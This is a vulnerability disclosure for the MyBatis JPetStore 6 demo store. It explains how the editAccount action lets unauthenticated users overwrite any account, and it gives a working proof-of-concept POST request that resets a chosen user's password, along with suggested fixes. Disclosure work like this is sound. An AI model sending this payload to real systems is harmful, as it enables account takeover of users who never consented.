# MyBatis JPetStore 6 AccountActionBean editAccount Authentication Bypass

# NAME OF AFFECTED PRODUCT(S)

- MyBatis JPetStore Demo 6

## Vendor Homepage

- [MyBatis](https://www.mybatis.org/)

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

- sh7err@vEcho

## VERSION(S)

- 6.1.1-SNAPSHOT (latest master, no fix available)

## Software Link

- [https://github.com/mybatis/jpetstore-6](https://github.com/mybatis/jpetstore-6)

# PROBLEM TYPE

## Vulnerability Type

- Authentication Bypass / Improper Access Control

## Root Cause

- The Stripes action `AccountActionBean` exposes the `editAccount` event without checking whether the current session is authenticated. Incoming POST parameters are automatically bound to the backing `Account` object via the setters `setUsername`, `setPassword`, and `setAccount.*`. When `editAccount()` runs, it calls `accountService.updateAccount(account)` (see `src/main/java/org/mybatis/jpetstore/web/actions/AccountActionBean.java:106-142`), which ultimately executes `UPDATE ACCOUNT ... WHERE USERID = #{username}` (file `src/main/resources/org/mybatis/jpetstore/mapper/AccountMapper.xml:79-124`). Because `username` is fully attacker-controlled, any unauthenticated client can overwrite arbitrary accounts—including the password stored in `SIGNON`—bypassing all authentication. No server-side logic reassigns the username from the session or validates the caller’s identity.

## Impact

- An unauthenticated attacker can modify profile data and reset the password of any account (including built-in demo users) by sending a single crafted POST request. This results in full account takeover, exposure of personal information, and potential privilege escalation wherever role-specific data exists.

# DESCRIPTION

- During analysis of MyBatis JPetStore 6, the `editAccount` action was found to be callable without a valid login. Stripes’ automatic binding allows any POST body to populate the internal `Account` object, including the primary key (`username`) and `password`. The action never checks `isAuthenticated()` nor does it restrict which fields may change. Consequently, `accountService.updateAccount` executes using the attacker-provided username and password. Because `AccountService.updateAccount` will update the signon table whenever a non-empty password is provided, the attacker can reset credentials for any user and immediately authenticate as that victim.

# CODE ANALYSIS

- `src/main/java/org/mybatis/jpetstore/web/actions/AccountActionBean.java:76-142` (setter-based binding and `editAccount` implementation)
- `src/main/java/org/mybatis/jpetstore/service/AccountService.java:67-73` (update logic cascades into password update)
- `src/main/resources/org/mybatis/jpetstore/mapper/AccountMapper.xml:79-124` (SQL uses attacker-controlled username)

# No login or authorization is required to exploit this vulnerability

# Vulnerability details and POC

## Vulnerability type:

- Authentication bypass leading to account takeover

## Vulnerability location:

- HTTP POST `/jpetstore/actions/Account.action` with the `editAccount` event

## Payload:

```
POST /jpetstore/actions/Account.action HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

editAccount=&username=ACID&password=Pwned123&account.firstName=Owned&account.lastName=User&account.email=test@example.com&account.phone=13300000000&account.address1=Somewhere&account.city=City&account.state=CA&account.zip=90210&account.country=US&account.languagePreference=english&account.favouriteCategoryId=DOGS
```

- The response returns HTTP 302 to the catalog page, and the password for user `ACID` is now `Pwned123`.

# Attack results

- Successful exploitation grants the attacker full control of the chosen account, including subsequent authenticated requests, order history access, and the ability to place orders as the victim.

# Suggested repair

1. Require authentication before executing `editAccount` (e.g., check `isAuthenticated()` and redirect to sign-on when unauthenticated).
2. Remove `setUsername` from client input in the edit workflow; instead, obtain the username from the authenticated session and overwrite the bound value before calling the service.
3. Consider using Stripes’ `@ValidateNestedProperties` or a custom binding policy to restrict which fields may be edited, and avoid binding of security-sensitive attributes such as `password` unless explicitly allowed.
